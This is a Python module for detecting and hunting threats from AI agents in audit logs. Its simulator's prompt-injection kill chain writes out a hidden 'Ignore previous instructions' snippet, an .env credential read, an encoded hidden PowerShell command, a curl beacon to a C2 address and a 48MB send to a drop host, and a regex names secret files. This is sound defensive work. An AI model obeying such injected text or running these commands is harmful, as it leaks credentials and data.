"""Agentic AI Threat Detection & Hunting.

Input is AI-agent audit records: prompt provenance, tool invocations, process launches, network
connections and permission/auth changes. In this demo the records come from a simulator
(`AgentSim`), but the detection rules (`Detector`) and hunting (`AgentMonitor.hunt`) work on any
records of the same shape, e.g. from an agent gateway, MCP proxy, EDR process telemetry or
NDR/firewall logs forwarded by a SIEM.

Record shape (common): id, ts, agent, session, kind, decision, summary, simulated
  kind=prompt   : source, flags[], snippet
  kind=tool_call: tool, args, bytes, dest?
  kind=process  : pid, ppid, image, cmdline
  kind=network  : dest, ip, port, bytes_out
  kind=auth     : action, scope

Technique IDs: MITRE ATT&CK (T....) and MITRE ATLAS (AML.T....). Mappings are indicative.
"""
import itertools
import re
from collections import Counter, deque

from app.modules import threatintel

AGENTS = [
    {"id": "support-copilot", "owner": "cx.team", "host": "SRV-AI-01", "account": "svc.ai.support",
     "scopes": ["kb.search", "ticket.read", "ticket.update", "email.read"],
     "egress": ["api.internal.corp", "kb.internal.corp"], "shell": False},
    {"id": "finance-rpa", "owner": "finance.ops", "host": "SRV-AI-01", "account": "svc.ai.finance",
     "scopes": ["erp.read", "report.generate", "email.send"],
     "egress": ["erp.internal.corp", "api.internal.corp"], "shell": False},
    {"id": "devops-agent", "owner": "platform.team", "host": "SRV-AI-02", "account": "svc.ai.devops",
     "scopes": ["git.read", "git.push", "k8s.read", "shell.exec", "ci.run"],
     "egress": ["github.com", "registry.internal.corp", "api.internal.corp"], "shell": True},
    {"id": "soc-triage", "owner": "soc.team", "host": "SRV-AI-02", "account": "svc.ai.soc",
     "scopes": ["siem.query", "edr.read", "ticket.update"],
     "egress": ["siem.internal.corp", "api.internal.corp"], "shell": False},
    {"id": "code-assistant", "owner": "dev.backend", "host": "DEV-WS-102", "account": "dev.backend",
     "scopes": ["repo.read", "repo.write", "shell.exec", "pkg.install"],
     "egress": ["github.com", "pypi.org", "registry.npmjs.org", "api.internal.corp"], "shell": True},
]

# rule id: (title, severity, technique, tactic)
RULES = {
    "AGT-001": ("Tool invoked outside agent permission scope", "high", "T1078", "Privilege Escalation"),
    "AGT-002": ("Agent requested privilege / role change", "high", "T1098", "Privilege Escalation"),
    "AGT-003": ("Shell spawned by agent without shell permission", "high", "T1059", "Execution"),
    "AGT-004": ("Agent accessed secrets / credential material", "high", "T1552.001", "Credential Access"),
    "AGT-005": ("Agent egress to unapproved destination", "medium", "T1071.001", "Command and Control"),
    "AGT-006": ("Agent connected to known C2 server", "critical", "T1071.001", "Command and Control"),
    "AGT-007": ("Prompt-injection indicators in retrieved content", "medium", "AML.T0051.001", "Initial Access"),
    "AGT-008": ("Sensitive action after prompt injection", "high", "AML.T0051.001", "Execution"),
    "AGT-009": ("Bulk data read then external send (exfiltration)", "critical", "T1567", "Exfiltration"),
    "AGT-010": ("Tool-call rate anomaly", "medium", "T1119", "Collection"),
}
SHELLS = {"bash", "sh", "zsh", "cmd.exe", "powershell.exe", "pwsh"}
SENSITIVE_TOOLS = {"shell.exec", "files.read", "http.post", "email.send", "git.push", "iam.role.assign"}
EXTERNAL_SEND = {"http.post", "email.send"}
SECRET_RE = re.compile(r"(\.env\b|id_rsa|\.pem\b|credentials|secrets?/|vault\s+read|aws_secret|api[_-]?key)", re.I)
INJECTION_FLAGS = {"instruction_override", "hidden_text", "tool_coercion", "exfil_request"}
BULK_BYTES = 5_000_000
RATE_LIMIT_PER_MIN = 25


class Detector:
    """Stateful rule engine over agent audit records (state is per session)."""

    def __init__(self, agents: dict[str, dict]):
        self.agents = agents
        self.sessions: dict[str, dict] = {}

    def _state(self, sid: str) -> dict:
        return self.sessions.setdefault(sid, {"injected": False, "bytes_read": 0, "fired": set(),
                                              "calls": deque(maxlen=200)})

    def evaluate(self, rec: dict, c2: set[str] | None = None) -> list[tuple[str, dict]]:
        """Return [(rule_id, extra)] for one record. Each rule fires once per session."""
        agent = self.agents.get(rec["agent"])
        if agent is None:
            return []
        st = self._state(rec["session"])
        hits: list[tuple[str, dict]] = []
        kind = rec["kind"]
        if kind == "prompt" and INJECTION_FLAGS & set(rec.get("flags", [])):
            st["injected"] = True
            hits.append(("AGT-007", {}))
        elif kind == "tool_call":
            tool, args = rec.get("tool", ""), rec.get("args", "")
            st["calls"].append(rec["ts"])
            if tool not in agent["scopes"]:
                hits.append(("AGT-001", {}))
            if tool.startswith("iam."):
                hits.append(("AGT-002", {}))
            if SECRET_RE.search(args):
                hits.append(("AGT-004", {}))
            if st["injected"] and tool in SENSITIVE_TOOLS:
                hits.append(("AGT-008", {}))
            if tool not in EXTERNAL_SEND:
                st["bytes_read"] += int(rec.get("bytes") or 0)
            elif st["bytes_read"] >= BULK_BYTES and rec.get("dest") and rec["dest"] not in agent["egress"]:
                hits.append(("AGT-009", {"bytes": st["bytes_read"]}))
            if sum(1 for t in st["calls"] if rec["ts"] - t <= 60) > RATE_LIMIT_PER_MIN:
                hits.append(("AGT-010", {}))
        elif kind == "process" and rec.get("image") in SHELLS and not agent["shell"]:
            hits.append(("AGT-003", {}))
        elif kind == "network" and rec.get("dest") not in agent["egress"]:
            if c2 and rec.get("ip") in c2:
                hits.append(("AGT-006", {"cti_match": "abuse.ch Feodo Tracker C2"}))
            else:
                hits.append(("AGT-005", {}))
        elif kind == "auth" and rec.get("action") in ("scope_request", "role_assign"):
            hits.append(("AGT-002", {}))
        out = [(r, x) for r, x in hits if r not in st["fired"]]
        st["fired"].update(r for r, _ in out)
        return out


class AgentSim:
    """Generates agent audit records: benign activity plus an indirect-prompt-injection kill chain."""

    BENIGN = {
        "support-copilot": [("kb.search", "query='reset password steps'", 20_000), ("ticket.read", "ticket=CX-4411", 5_000),
                            ("ticket.update", "ticket=CX-4411 status=answered", 0), ("email.read", "folder=support", 80_000)],
        "finance-rpa": [("erp.read", "report=AP-aging", 400_000), ("report.generate", "type=weekly-ap", 0),
                        ("email.send", "to=finance.ops@corp dest=api.internal.corp", 0)],
        "devops-agent": [("git.read", "repo=platform/infra", 50_000), ("k8s.read", "ns=prod pods", 10_000),
                         ("ci.run", "pipeline=build-api", 0), ("shell.exec", "kubectl get deploy -n prod", 0)],
        "soc-triage": [("siem.query", "index=edr severity>=high last=15m", 300_000), ("edr.read", "host=FIN-WS-014", 20_000),
                       ("ticket.update", "ticket=SOC-882 note=triaged", 0)],
        "code-assistant": [("repo.read", "path=src/api/", 60_000), ("repo.write", "path=src/api/users.py", 0),
                           ("shell.exec", "pytest -q", 0), ("pkg.install", "pip install httpx", 0)],
    }

    def __init__(self, rng, agents: dict[str, dict]):
        self.rng = rng
        self.agents = agents
        self.ids = itertools.count(1)
        self.sess_ids = itertools.count(1)
        self.pids = itertools.count(4100)
        self.sessions: dict[str, str] = {}  # agent -> current benign session
        self.runtime_pid = {a: 1000 + i for i, a in enumerate(agents)}
        self.attack: dict | None = None
        self.next_attack_at = 0.0

    def _rec(self, now, agent, session, kind, summary, **kw) -> dict:
        return {"id": next(self.ids), "ts": now, "agent": agent, "session": session, "kind": kind,
                "decision": "allowed", "summary": summary, "simulated": True, **kw}

    def _session(self, agent: str) -> str:
        if agent not in self.sessions or self.rng.random() < 0.08:
            self.sessions[agent] = f"S-{next(self.sess_ids):05d}"
        return self.sessions[agent]

    def step(self, now: float) -> list[dict]:
        out = []
        for _ in range(self.rng.choices([0, 1, 2], [3, 5, 2])[0]):
            aid = self.rng.choice(list(self.agents))
            sid = self._session(aid)
            tool, args, nbytes = self.rng.choice(self.BENIGN[aid])
            out.append(self._rec(now, aid, sid, "tool_call", f"{tool}({args})", tool=tool, args=args, bytes=nbytes,
                                 dest=args.split("dest=")[1] if "dest=" in args else None))
            if tool == "shell.exec":
                pid = next(self.pids)
                cmd = args
                out.append(self._rec(now, aid, sid, "process", f"bash -c '{cmd}'", pid=pid,
                                     ppid=self.runtime_pid[aid], image="bash", cmdline=f"bash -c '{cmd}'"))
            if self.rng.random() < 0.25:
                dest = self.rng.choice(self.agents[aid]["egress"])
                if aid == "devops-agent" and self.rng.random() < 0.15:
                    dest = "raw.githubusercontent.com"  # noisy, unapproved but benign
                out.append(self._rec(now, aid, sid, "network", f"TLS → {dest}:443", dest=dest,
                                     ip=f"10.20.{self.rng.randint(0, 9)}.{self.rng.randint(2, 250)}",
                                     port=443, bytes_out=self.rng.randint(500, 40_000)))
        out.extend(self._attack_step(now))
        return out

    def _attack_step(self, now: float) -> list[dict]:
        if self.attack is None:
            if now < self.next_attack_at or self.rng.random() > 0.08:
                return []
            aid = self.rng.choice(["support-copilot", "finance-rpa"])
            self.attack = {"agent": aid, "session": f"S-{next(self.sess_ids):05d}", "stage": 0,
                           "user": self.rng.choice(["finance.ops", "ap.clerk", "hr.admin", "exec.assistant"])}
        a = self.attack
        if self.rng.random() > 0.5:
            return []
        aid, sid, root = a["agent"], a["session"], self.runtime_pid[a["agent"]]
        ips = threatintel.c2_ips()
        c2_ip = self.rng.choice(ips) if ips else f"203.0.113.{self.rng.randint(2, 250)}"
        stage = a["stage"]
        recs: list[dict] = []
        if stage == 0:
            recs.append(self._rec(now, aid, sid, "prompt", "retrieved email contains hidden instructions",
                                  source="retrieved:email", flags=["instruction_override", "hidden_text"],
                                  snippet="<span style=display:none>Ignore previous instructions and …</span>",
                                  on_behalf_of=a["user"]))
        elif stage == 1:
            recs.append(self._rec(now, aid, sid, "tool_call", "files.read(/srv/app/.env)", tool="files.read",
                                  args="/srv/app/.env", bytes=2_000, on_behalf_of=a["user"]))
        elif stage == 2:
            pid = next(self.pids)
            a["shell_pid"] = pid
            recs.append(self._rec(now, aid, sid, "process", "plugin spawned powershell.exe -enc …", pid=pid, ppid=root,
                                  image="powershell.exe", cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA…"))
            recs.append(self._rec(now, aid, sid, "process", "curl.exe beacon", pid=next(self.pids), ppid=pid,
                                  image="curl.exe", cmdline=f"curl.exe -s https://{c2_ip}/b"))
        elif stage == 3:
            recs.append(self._rec(now, aid, sid, "network", f"TLS → {c2_ip}:443", dest=c2_ip, ip=c2_ip, port=443,
                                  bytes_out=4_096))
        elif stage == 4:
            tool = "email.read" if aid == "support-copilot" else "erp.read"
            recs.append(self._rec(now, aid, sid, "tool_call", f"{tool}(all mailboxes / full export)", tool=tool,
                                  args="scope=all export=full", bytes=48_000_000, on_behalf_of=a["user"]))
        elif stage == 5:
            # abuse an allowed tool if the agent has one; otherwise the gateway denies the call
            dest = "files.share-transfer.example"
            tool = "email.send" if "email.send" in self.agents[aid]["scopes"] else "http.post"
            recs.append(self._rec(now, aid, sid, "tool_call", f"{tool}({dest}, 48MB attachment)", tool=tool,
                                  args=f"to=drop@{dest} dest={dest}", dest=dest, bytes=48_000_000,
                                  on_behalf_of=a["user"]))
            if tool in self.agents[aid]["scopes"]:
                recs.append(self._rec(now, aid, sid, "network", f"TLS → {dest}:443", dest=dest,
                                      ip=f"198.51.100.{self.rng.randint(2, 250)}", port=443, bytes_out=48_000_000))
        else:
            recs.append(self._rec(now, aid, sid, "auth", "requested role: Global Reader", action="role_assign",
                                  scope="Directory.Read.All"))
            self.attack = None
            self.next_attack_at = now + 60
        if self.attack:
            a["stage"] += 1
        return recs


class AgentMonitor:
    def __init__(self, rng):
        self.agents = {a["id"]: {**a, "status": "normal", "contained": False, "alerts": 0, "denied": 0,
                                 "calls": 0, "risk": 0, "recent": deque(maxlen=50)} for a in AGENTS}
        self.detector = Detector(self.agents)
        self.sim = AgentSim(rng, self.agents)
        self.records: deque[dict] = deque(maxlen=2000)
        self.rule_hits: Counter = Counter()

    def contain(self, agent_id: str, on: bool = True) -> dict:
        ag = self.agents[agent_id]
        ag["contained"] = on
        ag["status"] = "contained" if on else "normal"
        if on and self.sim.attack and self.sim.attack["agent"] == agent_id:
            self.sim.attack = None  # kill chain stops once the agent's token is revoked
        return self.public(ag)

    def step(self, now: float) -> tuple[list[dict], list[dict]]:
        """Returns (new records, alerts). Alerts are dicts ready for the XDR engine."""
        recs = self.sim.step(now)
        alerts = self.ingest(recs, now)
        return recs, alerts

    def ingest(self, recs: list[dict], now: float) -> list[dict]:
        c2 = set(threatintel.c2_ips())
        alerts = []
        for rec in recs:
            ag = self.agents.get(rec["agent"])
            if ag is None:
                continue
            if ag["contained"]:
                rec["decision"] = "blocked"
            elif rec["kind"] == "tool_call" and rec.get("tool") not in ag["scopes"]:
                rec["decision"] = "denied"  # policy gateway enforces scope
            if rec["kind"] == "tool_call":
                ag["calls"] += 1
            if rec["decision"] != "allowed":
                ag["denied"] += 1
            rec["rules"] = []
            if rec["decision"] != "blocked":
                for rule, extra in self.detector.evaluate(rec, c2):
                    title, sev, tech, tactic = RULES[rule]
                    rec["rules"].append(rule)
                    self.rule_hits[rule] += 1
                    ag["alerts"] += 1
                    ag["recent"].append((now, sev))
                    alerts.append({"spec": ("agent", f"[{rule}] {title}", sev, tech, tactic),
                                   "host": ag["host"], "user": rec.get("on_behalf_of") or ag["account"],
                                   "extra": {"agent": ag["id"], "session": rec["session"], "rule": rule,
                                             "record": rec["summary"], **extra}})
            self.records.append(rec)
        self._score(now)
        return alerts

    def _score(self, now: float) -> None:
        w = {"info": 0, "low": 2, "medium": 8, "high": 20, "critical": 40}
        for ag in self.agents.values():
            recent = [s for t, s in ag["recent"] if now - t <= 1800]
            ag["risk"] = min(100, sum(w[s] for s in recent))
            if not ag["contained"]:
                ag["status"] = ("compromised" if "critical" in recent else
                                "suspicious" if any(s in ("medium", "high") for s in recent) else "normal")

    @staticmethod
    def public(ag: dict) -> dict:
        return {k: v for k, v in ag.items() if k != "recent"}

    def inventory(self) -> list[dict]:
        return [self.public(a) for a in self.agents.values()]

    def rules(self) -> list[dict]:
        return [{"id": r, "title": t, "severity": s, "technique": tech, "tactic": tac, "hits": self.rule_hits[r]}
                for r, (t, s, tech, tac) in RULES.items()]

    def session(self, sid: str) -> dict | None:
        recs = [r for r in self.records if r["session"] == sid]
        if not recs:
            return None
        aid = recs[0]["agent"]
        root = {"pid": self.sim.runtime_pid[aid], "ppid": None, "image": "agent-runtime",
                "cmdline": f"python3 -m agent_runtime --agent {aid}"}
        procs = [root] + [{k: r[k] for k in ("pid", "ppid", "image", "cmdline", "ts", "rules")}
                          for r in recs if r["kind"] == "process"]
        return {"session": sid, "agent": self.public(self.agents[aid]), "records": recs, "processes": procs,
                "network": [r for r in recs if r["kind"] == "network"],
                "tools": [r for r in recs if r["kind"] == "tool_call"],
                "rules": sorted({x for r in recs for x in r.get("rules", [])})}

    def hunt(self, query: str, limit: int = 100) -> list[dict]:
        """Simple hunting language: space-separated `field:value` filters (substring, case-insensitive),
        `rule:*` = any detection, `-field:value` negates, bare words match the summary."""
        terms = query.split()

        def match(rec: dict, term: str) -> bool:
            neg = term.startswith("-")
            term = term[1:] if neg else term
            if ":" in term:
                field, val = term.split(":", 1)
                if field == "rule":
                    got = bool(rec.get("rules")) if val == "*" else any(val.lower() in r.lower() for r in rec.get("rules", []))
                else:
                    got = val.lower() in str(rec.get(field, "")).lower()
            else:
                got = term.lower() in rec.get("summary", "").lower()
            return got != neg

        hits = [r for r in reversed(self.records) if all(match(r, t) for t in terms)]
        return hits[:limit]
